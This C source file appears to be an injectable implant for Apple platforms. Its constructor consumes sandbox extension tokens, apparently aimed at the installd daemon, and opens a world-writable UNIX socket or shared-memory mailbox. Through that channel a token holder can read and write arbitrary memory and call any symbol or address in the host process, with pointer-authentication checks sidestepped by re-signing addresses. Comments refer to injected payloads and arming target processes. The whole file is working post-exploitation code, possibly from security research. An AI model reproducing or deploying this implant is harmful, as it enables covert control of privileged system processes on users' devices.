#include "CNDLabRemoteCallProtocol.h"

#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <mach-o/dyld.h>
#include <mach/mach.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/un.h>
#include <syslog.h>
#include <time.h>
#include <unistd.h>
#include <stdarg.h>

#ifndef CND_LAB_EMBEDDED_TOKEN_HEX
#define CND_LAB_EMBEDDED_TOKEN_HEX ""
#endif
#ifndef CND_LAB_INSTALLD_SOCKET_PATH
#define CND_LAB_INSTALLD_SOCKET_PATH ""
#endif
#ifndef CND_LAB_INSTALLD_SANDBOX_TOKEN
#define CND_LAB_INSTALLD_SANDBOX_TOKEN ""
#endif
#ifndef CND_LAB_INSTALLD_BUNDLE_SANDBOX_TOKEN
#define CND_LAB_INSTALLD_BUNDLE_SANDBOX_TOKEN ""
#endif
#ifndef CND_LAB_FORCE_MAILBOX
#define CND_LAB_FORCE_MAILBOX 0
#endif

#if __has_feature(ptrauth_calls)
#include <ptrauth.h>
#endif

typedef uint64_t (*CNDLabCallFunction)(
    uint64_t, uint64_t, uint64_t, uint64_t,
    uint64_t, uint64_t, uint64_t, uint64_t);

typedef struct {
    CNDLabCallFunction function;
    uint64_t arguments[8];
} CNDLabOneWayCall;

typedef struct {
    pthread_mutex_t lock;
    pthread_cond_t requestCondition;
    pthread_cond_t responseCondition;
    CNDLabCallFunction function;
    uint64_t arguments[8];
    uint64_t value;
    int active;
    int finished;
} CNDLabCallExecutor;

static void *gCNDLabScratch;
static __thread CNDLabRemoteCallMailbox *gCNDLabMailbox;
static volatile uint32_t gCNDLabTainted;
static volatile uint32_t gCNDLabExecutorStarted;
static CNDLabCallExecutor gCNDLabExecutor = {
    .lock = PTHREAD_MUTEX_INITIALIZER,
    .requestCondition = PTHREAD_COND_INITIALIZER,
    .responseCondition = PTHREAD_COND_INITIALIZER,
};

static void cnd_diagnostic(const char *format, ...)
{
    int fd = open("/var/installd/Library/Caches/.cnd-rc-loaded",
                  O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd < 0) return;
    char line[256] = {0};
    va_list arguments;
    va_start(arguments, format);
    int length = vsnprintf(line, sizeof(line), format, arguments);
    va_end(arguments);
    if (length > 0) {
        size_t amount = (size_t)length < sizeof(line)
            ? (size_t)length : sizeof(line) - 1;
        (void)write(fd, line, amount);
    }
    close(fd);
}

static int cnd_transfer_all(int fd, void *buffer, size_t size, int writing)
{
    uint8_t *cursor = buffer;
    while (size > 0) {
        ssize_t amount = writing
            ? write(fd, cursor, size) : read(fd, cursor, size);
        if (amount == 0) return ECONNRESET;
        if (amount < 0) {
            if (errno == EINTR) continue;
            return errno ? errno : EIO;
        }
        cursor += (size_t)amount;
        size -= (size_t)amount;
    }
    return 0;
}

static void cnd_process_name(char output[CND_LAB_REMOTECALL_PROCESS_LENGTH])
{
    const char *name = getprogname();
    if (!name || !name[0]) name = "unknown";
    strlcpy(output, name, CND_LAB_REMOTECALL_PROCESS_LENGTH);
}

static void cnd_executable_path(
    char output[CND_LAB_REMOTECALL_EXECUTABLE_LENGTH])
{
    uint32_t size = CND_LAB_REMOTECALL_EXECUTABLE_LENGTH;
    if (_NSGetExecutablePath(output, &size) != 0) output[0] = '\0';
}

static int cnd_read_token(
    uint8_t output[CND_LAB_REMOTECALL_TOKEN_LENGTH])
{
    // Every injected payload has a fresh per-target credential. Prefer it so
    // arming a second process cannot rotate the first process's credential
    // out from under its still-live endpoint.
    const char *hex = CND_LAB_EMBEDDED_TOKEN_HEX;
    if (strlen(hex) == CND_LAB_REMOTECALL_TOKEN_LENGTH * 2) {
        for (size_t i = 0; i < CND_LAB_REMOTECALL_TOKEN_LENGTH; i++) {
            unsigned int value = 0;
            if (sscanf(hex + (i * 2), "%2x", &value) != 1) return EPROTO;
            output[i] = (uint8_t)value;
        }
        return 0;
    }

    int fd = open(CND_LAB_REMOTECALL_TOKEN_PATH, O_RDONLY);
    if (fd >= 0) {
        uint8_t bytes[CND_LAB_REMOTECALL_TOKEN_LENGTH + 1] = {0};
        ssize_t amount = read(fd, bytes, sizeof(bytes));
        int saved = errno;
        close(fd);
        if (amount == CND_LAB_REMOTECALL_TOKEN_LENGTH) {
            memcpy(output, bytes, CND_LAB_REMOTECALL_TOKEN_LENGTH);
            return 0;
        }
        if (amount < 0 && saved != EACCES && saved != EPERM) {
            return saved ? saved : EIO;
        }
    }

    return EACCES;
}

static int cnd_token_matches(
    const uint8_t supplied[CND_LAB_REMOTECALL_TOKEN_LENGTH])
{
    uint8_t expected[CND_LAB_REMOTECALL_TOKEN_LENGTH] = {0};
    int result = cnd_read_token(expected);
    if (result != 0) return result;
    uint8_t difference = 0;
    for (size_t i = 0; i < sizeof(expected); i++) {
        difference |= expected[i] ^ supplied[i];
    }
    memset(expected, 0, sizeof(expected));
    return difference == 0 ? 0 : EACCES;
}

static CNDLabCallFunction cnd_sign_function_address(uint64_t address)
{
    if (!address) return NULL;
    void *pointer = (void *)(uintptr_t)address;
#if __has_feature(ptrauth_calls)
    pointer = ptrauth_strip(pointer, ptrauth_key_function_pointer);
    pointer = ptrauth_sign_unauthenticated(
        pointer, ptrauth_key_function_pointer, 0);
#endif
    return (CNDLabCallFunction)pointer;
}

static uint64_t cnd_invoke(
    CNDLabCallFunction function, const uint64_t arguments[8])
{
    return function(arguments[0], arguments[1], arguments[2], arguments[3],
                    arguments[4], arguments[5], arguments[6], arguments[7]);
}

static void *cnd_one_way_call(void *opaque)
{
    CNDLabOneWayCall *call = opaque;
    CNDLabCallFunction function = call->function;
    uint64_t arguments[8] = {0};
    memcpy(arguments, call->arguments, sizeof(arguments));
    free(call);
    (void)cnd_invoke(function, arguments);
    return NULL;
}

static int cnd_dispatch_one_way(
    CNDLabCallFunction function, const uint64_t arguments[8])
{
    CNDLabOneWayCall *call = calloc(1, sizeof(*call));
    if (!call) return ENOMEM;
    call->function = function;
    memcpy(call->arguments, arguments, sizeof(call->arguments));
    pthread_t thread = 0;
    int result = pthread_create(&thread, NULL, cnd_one_way_call, call);
    if (result != 0) {
        free(call);
        return result;
    }
    (void)pthread_detach(thread);
    return 0;
}

static void *cnd_call_executor_worker(void *unused)
{
    (void)unused;
    CNDLabCallExecutor *executor = &gCNDLabExecutor;
    for (;;) {
        (void)pthread_mutex_lock(&executor->lock);
        while (!executor->active) {
            (void)pthread_cond_wait(
                &executor->requestCondition, &executor->lock);
        }
        CNDLabCallFunction function = executor->function;
        uint64_t arguments[8] = {0};
        memcpy(arguments, executor->arguments, sizeof(arguments));
        (void)pthread_mutex_unlock(&executor->lock);

        uint64_t value = cnd_invoke(function, arguments);

        (void)pthread_mutex_lock(&executor->lock);
        executor->value = value;
        executor->finished = 1;
        executor->active = 0;
        (void)pthread_cond_broadcast(&executor->responseCondition);
        (void)pthread_mutex_unlock(&executor->lock);
    }
}

static int cnd_invoke_with_timeout(
    CNDLabCallFunction function, const uint64_t arguments[8],
    uint32_t timeout_ms, uint64_t *value_out)
{
    if (__atomic_load_n(&gCNDLabExecutorStarted, __ATOMIC_ACQUIRE) == 0) {
        return ENXIO;
    }
    CNDLabCallExecutor *executor = &gCNDLabExecutor;

    if (timeout_ms == 0) timeout_ms = 10000;
    struct timespec deadline = {0};
    (void)clock_gettime(CLOCK_REALTIME, &deadline);
    deadline.tv_sec += timeout_ms / 1000;
    deadline.tv_nsec += (long)(timeout_ms % 1000) * 1000000L;
    if (deadline.tv_nsec >= 1000000000L) {
        deadline.tv_sec++;
        deadline.tv_nsec -= 1000000000L;
    }

    (void)pthread_mutex_lock(&executor->lock);
    if (executor->active) {
        (void)pthread_mutex_unlock(&executor->lock);
        return EBUSY;
    }
    executor->function = function;
    memcpy(executor->arguments, arguments, sizeof(executor->arguments));
    executor->value = 0;
    executor->finished = 0;
    executor->active = 1;
    (void)pthread_cond_signal(&executor->requestCondition);

    int result = 0;
    while (!executor->finished && result == 0) {
        result = pthread_cond_timedwait(
            &executor->responseCondition, &executor->lock, &deadline);
    }
    if (!executor->finished) {
        (void)pthread_mutex_unlock(&executor->lock);
        __atomic_store_n(&gCNDLabTainted, 1, __ATOMIC_RELEASE);
        return result == 0 ? ETIMEDOUT : result;
    }
    uint64_t value = executor->value;
    (void)pthread_mutex_unlock(&executor->lock);
    if (value_out) *value_out = value;
    return 0;
}

static int cnd_send_response(int clientOut, uint32_t operation, int status,
                             uint32_t length, uint64_t value)
{
    CNDLabRemoteCallResponse response = {
        .magic = CND_LAB_REMOTECALL_MAGIC,
        .version = CND_LAB_REMOTECALL_VERSION,
        .operation = operation,
        .status = status,
        .pid = getpid(),
        .length = length,
        .value = value,
        .scratchAddress = (uint64_t)(uintptr_t)gCNDLabScratch,
    };
    cnd_process_name(response.process);
    cnd_executable_path(response.executable);
    if (clientOut < 0 && gCNDLabMailbox) {
        gCNDLabMailbox->response = response;
        return 0;
    }
    return cnd_transfer_all(clientOut, &response, sizeof(response), 1);
}

static int cnd_handle_request(int clientIn, int clientOut,
                              const CNDLabRemoteCallRequest *request)
{
    if (request->magic != CND_LAB_REMOTECALL_MAGIC ||
        request->version != CND_LAB_REMOTECALL_VERSION ||
        request->length > CND_LAB_REMOTECALL_MAX_TRANSFER) {
        (void)cnd_send_response(clientOut, request->operation, EPROTO, 0, 0);
        return EPROTO;
    }

    int authentication = cnd_token_matches(request->token);
    if (authentication != 0) {
        (void)cnd_send_response(
            clientOut, request->operation, authentication, 0, 0);
        return authentication;
    }
    if (request->expectedPID > 1 && request->expectedPID != getpid()) {
        (void)cnd_send_response(clientOut, request->operation, ESRCH, 0, 0);
        return ESRCH;
    }

    if (__atomic_load_n(&gCNDLabTainted, __ATOMIC_ACQUIRE) != 0 &&
        request->operation != CNDLabRemoteCallOperationClose) {
        return cnd_send_response(
            clientOut, request->operation, ECANCELED, 0, 0);
    }

    if (request->operation == CNDLabRemoteCallOperationHandshake) {
        char process[CND_LAB_REMOTECALL_PROCESS_LENGTH] = {0};
        cnd_process_name(process);
        if (!request->process[0] ||
            strncmp(request->process, process, sizeof(process)) != 0) {
            (void)cnd_send_response(clientOut, request->operation, ESRCH, 0, 0);
            return ESRCH;
        }
        return cnd_send_response(clientOut, request->operation, 0, 0, 0);
    }

    if (request->operation == CNDLabRemoteCallOperationClose) {
        return cnd_send_response(clientOut, request->operation, 0, 0, 0);
    }

    if (request->operation == CNDLabRemoteCallOperationRead) {
        uint8_t payload[CND_LAB_REMOTECALL_MAX_TRANSFER];
        if (!request->address || !request->length) {
            return cnd_send_response(
                clientOut, request->operation, EINVAL, 0, 0);
        }
        memcpy(payload, (const void *)(uintptr_t)request->address,
               request->length);
        int result = cnd_send_response(
            clientOut, request->operation, 0, request->length, 0);
        if (result == 0 && clientOut < 0 && gCNDLabMailbox) {
            memcpy(gCNDLabMailbox->payload, payload, request->length);
        } else if (result == 0) {
            result = cnd_transfer_all(
                clientOut, payload, request->length, 1);
        }
        return result;
    }

    if (request->operation == CNDLabRemoteCallOperationWrite) {
        uint8_t payload[CND_LAB_REMOTECALL_MAX_TRANSFER];
        int result = 0;
        if (request->length > 0 && clientIn < 0 && gCNDLabMailbox) {
            memcpy(payload, gCNDLabMailbox->payload, request->length);
        } else if (request->length > 0) {
            result = cnd_transfer_all(
                clientIn, payload, request->length, 0);
        }
        if (result != 0) return result;
        if (!request->address || !request->length) {
            return cnd_send_response(
                clientOut, request->operation, EINVAL, 0, 0);
        }
        memcpy((void *)(uintptr_t)request->address, payload, request->length);
        return cnd_send_response(clientOut, request->operation, 0, 0, 0);
    }

    CNDLabCallFunction function = NULL;
    if (request->operation == CNDLabRemoteCallOperationCallSymbol) {
        if (!request->symbol[0] ||
            request->symbol[CND_LAB_REMOTECALL_SYMBOL_LENGTH - 1] != '\0') {
            return cnd_send_response(
                clientOut, request->operation, EINVAL, 0, 0);
        }
        function = (CNDLabCallFunction)dlsym(RTLD_DEFAULT, request->symbol);
    } else if (request->operation == CNDLabRemoteCallOperationCallAddress) {
        function = cnd_sign_function_address(request->address);
    } else {
        return cnd_send_response(
            clientOut, request->operation, ENOTSUP, 0, 0);
    }
    if (!function) {
        return cnd_send_response(
            clientOut, request->operation, ENOENT, 0, 0);
    }

    if ((request->flags & CNDLabRemoteCallFlagOneWay) != 0) {
        int status = cnd_dispatch_one_way(function, request->arguments);
        return cnd_send_response(clientOut, request->operation, status, 0, 0);
    }
    uint64_t value = 0;
    int invoke_result = cnd_invoke_with_timeout(
        function, request->arguments, request->timeoutMS, &value);
    if (invoke_result != 0) {
        return cnd_send_response(
            clientOut, request->operation, invoke_result, 0, 0);
    }
    return cnd_send_response(clientOut, request->operation, 0, 0, value);
}

static int cnd_handle_client(int clientIn, int clientOut)
{
    int one = 1;
    (void)setsockopt(clientIn, SOL_SOCKET, SO_NOSIGPIPE, &one, sizeof(one));
    if (clientOut != clientIn) {
        (void)setsockopt(clientOut, SOL_SOCKET, SO_NOSIGPIPE,
                         &one, sizeof(one));
    }
    for (;;) {
        CNDLabRemoteCallRequest request = {0};
        int result = cnd_transfer_all(
            clientIn, &request, sizeof(request), 0);
        if (result != 0) return result;
        result = cnd_handle_request(clientIn, clientOut, &request);
        if (result != 0 ||
            request.operation == CNDLabRemoteCallOperationClose) {
            return result;
        }
    }
}

static void *cnd_remotecall_server(void *unused)
{
    (void)unused;
    char process[CND_LAB_REMOTECALL_PROCESS_LENGTH] = {0};
    cnd_process_name(process);
    cnd_diagnostic("server process=%s\n", process);
    syslog(LOG_NOTICE, "CNDLabRemoteCall server start process=%s", process);
    for (size_t i = 0; process[i]; i++) {
        char c = process[i];
        if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
              (c >= '0' && c <= '9') || c == '.' || c == '_' || c == '-')) {
            return NULL;
        }
    }

    char path[sizeof(((struct sockaddr_un *)0)->sun_path)] = {0};
    int count = snprintf(path, sizeof(path), "%s%s%s",
                         CND_LAB_REMOTECALL_SOCKET_PREFIX, process,
                         CND_LAB_REMOTECALL_SOCKET_SUFFIX);
    if (count <= 0 || (size_t)count >= sizeof(path)) return NULL;

    int server = -1;
    if (!CND_LAB_FORCE_MAILBOX) {
        server = socket(AF_UNIX, SOCK_STREAM, 0);
        if (server < 0) return NULL;
        int one = 1;
        (void)setsockopt(server, SOL_SOCKET, SO_NOSIGPIPE, &one, sizeof(one));

        struct sockaddr_un address = { .sun_family = AF_UNIX };
        strlcpy(address.sun_path, path, sizeof(address.sun_path));
        (void)unlink(path);
        if (bind(server, (const struct sockaddr *)&address, sizeof(address)) != 0 ||
            chmod(path, 0666) != 0 || listen(server, 2) != 0) {
            syslog(LOG_NOTICE, "CNDLabRemoteCall unix bind failed errno=%d", errno);
            close(server);
            (void)unlink(path);
            server = -1;
        }
    } else {
        (void)unlink(path);
    }

    const char *basePath = CND_LAB_INSTALLD_SOCKET_PATH;
    if (server < 0 && basePath[0]) {
        char mailboxPath[PATH_MAX] = {0};
        if (!basePath[0] ||
            snprintf(mailboxPath, sizeof(mailboxPath), "%s.mailbox",
                     basePath) >= (int)sizeof(mailboxPath)) {
            return NULL;
        }
        (void)unlink(mailboxPath);
        int mailboxFD = open(mailboxPath,
            O_RDWR | O_CREAT | O_EXCL | O_NOFOLLOW, 0666);
        if (mailboxFD < 0 ||
            ftruncate(mailboxFD, sizeof(CNDLabRemoteCallMailbox)) != 0 ||
            chmod(mailboxPath, 0666) != 0) {
            cnd_diagnostic("mailbox failed errno=%d path=%s\n",
                           errno, mailboxPath);
            if (mailboxFD >= 0) close(mailboxFD);
            (void)unlink(mailboxPath);
            return NULL;
        }
        CNDLabRemoteCallMailbox *mailbox = mmap(
            NULL, sizeof(*mailbox), PROT_READ | PROT_WRITE,
            MAP_SHARED, mailboxFD, 0);
        if (mailbox == MAP_FAILED) {
            close(mailboxFD);
            (void)unlink(mailboxPath);
            return NULL;
        }
        memset(mailbox, 0, sizeof(*mailbox));
        cnd_diagnostic("mailbox ready path=%s\n", mailboxPath);
        uint64_t handledSequence = 0;
        for (;;) {
            uint64_t sequence = __atomic_load_n(
                &mailbox->requestSequence, __ATOMIC_ACQUIRE);
            if (sequence == handledSequence) {
                usleep(1000);
                continue;
            }
            CNDLabRemoteCallRequest request = mailbox->request;
            gCNDLabMailbox = mailbox;
            (void)cnd_handle_request(-1, -1, &request);
            gCNDLabMailbox = NULL;
            handledSequence = sequence;
            __atomic_store_n(
                &mailbox->responseSequence, sequence, __ATOMIC_RELEASE);
        }
    }

    for (;;) {
        int client = accept(server, NULL, NULL);
        if (client < 0) {
            if (errno == EINTR) continue;
            break;
        }
        (void)cnd_handle_client(client, client);
        close(client);
    }
    close(server);
    if (path[0]) (void)unlink(path);
    return NULL;
}

__attribute__((constructor))
static void cnd_remotecall_start(void)
{
    if (CND_LAB_INSTALLD_SANDBOX_TOKEN[0]) {
        typedef int64_t (*ConsumeFunction)(const char *);
        ConsumeFunction consume = (ConsumeFunction)dlsym(
            RTLD_DEFAULT, "sandbox_extension_consume");
        int64_t handle = consume
            ? consume(CND_LAB_INSTALLD_SANDBOX_TOKEN) : -1;
        syslog(LOG_NOTICE, "CNDLabRemoteCall sandbox handle=%lld",
               (long long)handle);
    }
    if (CND_LAB_INSTALLD_BUNDLE_SANDBOX_TOKEN[0]) {
        typedef int64_t (*ConsumeFunction)(const char *);
        ConsumeFunction consume = (ConsumeFunction)dlsym(
            RTLD_DEFAULT, "sandbox_extension_consume");
        if (consume) {
            (void)consume(CND_LAB_INSTALLD_BUNDLE_SANDBOX_TOKEN);
        }
    }
    int diagnostic = open(
        "/var/installd/Library/Caches/.cnd-rc-loaded",
        O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (diagnostic >= 0) {
        char line[64] = {0};
        int length = snprintf(line, sizeof(line), "pid=%d\n", getpid());
        if (length > 0) (void)write(diagnostic, line, (size_t)length);
        close(diagnostic);
    }
    if (!gCNDLabScratch) {
        gCNDLabScratch = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE,
                             MAP_PRIVATE | MAP_ANON, -1, 0);
        if (gCNDLabScratch == MAP_FAILED) gCNDLabScratch = NULL;
    }
    if (!gCNDLabScratch) return;
    pthread_t executorThread = 0;
    int executorResult = pthread_create(
        &executorThread, NULL, cnd_call_executor_worker, NULL);
    if (executorResult != 0) {
        cnd_diagnostic("executor pthread result=%d\n", executorResult);
        return;
    }
    (void)pthread_detach(executorThread);
    __atomic_store_n(&gCNDLabExecutorStarted, 1, __ATOMIC_RELEASE);
    pthread_t thread = 0;
    int result = pthread_create(&thread, NULL, cnd_remotecall_server, NULL);
    cnd_diagnostic("pthread result=%d\n", result);
    syslog(LOG_NOTICE, "CNDLabRemoteCall pthread_create=%d", result);
    if (result == 0) {
        (void)pthread_detach(thread);
    }
}
